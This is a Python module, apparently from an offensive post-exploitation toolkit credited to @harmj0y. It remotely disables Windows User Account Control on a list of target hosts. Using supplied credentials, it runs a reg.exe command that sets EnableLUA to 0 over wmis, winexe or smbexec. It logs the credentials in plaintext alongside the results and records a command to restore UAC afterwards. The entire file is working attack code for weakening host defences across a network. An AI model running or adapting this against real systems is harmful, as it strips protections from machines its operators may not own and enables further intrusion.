"""

Module to disable UAC on a host or host list.

Module built by @harmj0y

"""

from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Disable UAC"
        self.description = "Disables User Access Control (UAC) on a host or host list."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method" : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"]}
        
    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        for target in self.targets:
            
            # reg.exe command to disable UAC
            command = "reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
            result = command_methods.executeResult(target, username, password, command, triggerMethod)

            cleanupCommand = command = "reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f"

            if result == "":
                self.output += "[!] No result file, UAC disabled failed using creds '"+username+":"+password+"' on : " + target + "\n"
            elif "The operation completed successfully" in result:
                self.output += "[*] UAC successfully disabled using creds '"+username+":"+password+"' on : " + target + "\n"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+command+"|"+triggerMethod+"\n"
            else:
                self.output += "[!] Error in disabling UAC using creds '"+username+":"+password+"' on : " + target + "\n"

